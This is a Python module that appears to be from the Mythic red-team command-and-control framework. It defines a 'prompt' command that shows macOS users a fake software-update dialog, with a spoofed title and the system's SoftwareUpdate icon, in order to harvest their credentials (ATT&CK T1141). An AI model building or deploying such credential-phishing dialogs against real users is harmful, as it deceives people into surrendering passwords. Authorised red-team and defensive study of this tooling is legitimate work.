from mythic_payloadtype_container.MythicCommandBase import *
import json


class PromptArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "title": CommandParameter(
                name="title",
                type=ParameterType.String,
                description="Title of the dialog box",
                required=False,
                default_value="Application Needs to Update",
            ),
            "icon": CommandParameter(
                name="icon",
                type=ParameterType.String,
                required=False,
                description="full path to .icns file to use",
                default_value="/System/Library/PreferencePanes/SoftwareUpdate.prefPane/Contents/Resources/SoftwareUpdate.icns",
            ),
            "text": CommandParameter(
                name="text",
                type=ParameterType.String,
                required=False,
                description="additional descriptive text to display",
                default_value="An application needs permission to update",
            ),
            "answer": CommandParameter(
                name="answer",
                type=ParameterType.String,
                required=False,
                description="Default answer to pre-populate",
            ),
        }

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
            else:
                raise ValueError("Missing JSON argument")
        else:
            raise ValueError("Missing arguments")


class PromptCommand(CommandBase):
    cmd = "prompt"
    needs_admin = False
    help_cmd = "prompt"
    description = "Create a custom prompt to ask the user for credentials where you can provide titles, icons, text and default answer."
    version = 1
    author = "@its_a_feature_"
    attackmapping = ["T1141"]
    argument_class = PromptArguments

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.display_params = f"user with title \"{task.args.get_arg('title')}\" and message \"{task.args.get_arg('text')}\""
        return task

    async def process_response(self, response: AgentResponse):
        pass
